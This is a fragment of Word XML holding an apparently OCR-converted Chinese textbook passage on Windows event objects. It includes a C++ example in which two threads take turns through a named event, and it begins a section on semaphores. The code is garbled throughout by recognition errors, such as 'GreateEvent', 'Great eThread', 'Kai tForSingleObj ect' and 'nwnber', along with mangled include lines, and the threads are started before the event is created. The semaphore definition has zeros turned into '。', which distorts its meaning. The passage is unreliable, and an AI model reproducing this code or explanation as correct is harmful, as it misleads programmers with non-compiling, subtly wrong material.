        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>”事件”机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>制应注意以下事项：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1000"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="100"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="236" w:name="bookmark245"/>
      <w:bookmarkEnd w:id="236"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果跨进程访问事件，必须对事件命名，在对事件命名的时候，要注意不要与系 统命名空间中的其它全局命名对象冲突；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="995"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="237" w:name="bookmark246"/>
      <w:bookmarkEnd w:id="237"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事件是否要自动恢复；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="995"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="238" w:name="bookmark247"/>
      <w:bookmarkEnd w:id="238"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>事件的初始状态设置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>由于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>event</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对象属于内核对象,故进程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以调用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>OpenEvent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>函数通过对象的名字获得 进程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>event</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对象的句柄，然后将这个句柄用于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ResetEvent </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> SetEvent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>WaitForMultipleObjects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>等函数中。此法可以实现一个进程的线程控制另一进程中线 程的运行，例如：</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•include "stdafx. h"</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^include〈windows. h&gt;</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#include&lt;i ostream,</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 xml:space="preserve">int number = 1; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃定义全局変里</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HANDLE hEvent; //</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>定义事件句柄</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="2245"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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ThreadProcl (void* Ip)</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520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Wai tForSingleObj ect (hEvent, INFINITE); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃等待对象为有信号状态</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 xml:space="preserve">cout </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">« </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"thread 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</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++number</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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.sleep (100);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SetEvent (hEvent)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>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315" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return 0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</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tabs>
          <w:tab w:val="left" w:pos="2245"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>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ThreadProc2 (void* Ip)</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240" w:lineRule="auto"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Kai tForSingleObj ect (hEvent, INFINITE); </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>〃等待对象为有信号状态</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">« </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">"thread 2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>^«nwnber « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>++nwnber</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07" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">_sleep </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(100):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1520" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SetEvent (hEvent)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>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307" w:lineRule="exact"/>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300" w:line="307"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307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>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after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="80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307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Great eThread (NULL, 0, ThreadProcl, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Great eThread (NULL, 0, ThreadProc2, NULL, 0, NULL);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hEvent = GreateEvent(NULL, FALSE, TRUE, "event");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Sleep (10*1000)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="1160" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>system("pause")</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="140" w:line="307" w:lineRule="exact"/>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660" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="239" w:name="bookmark248"/>
      <w:bookmarkEnd w:id="239"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号量</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号量是维护。到指定最大值之间的同步对象。信号量状态在其计数大于。时是有信号 的，而其计数是。时是无信号的。信号量対象在控制上可以支持有限数量共享资源的访 问。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
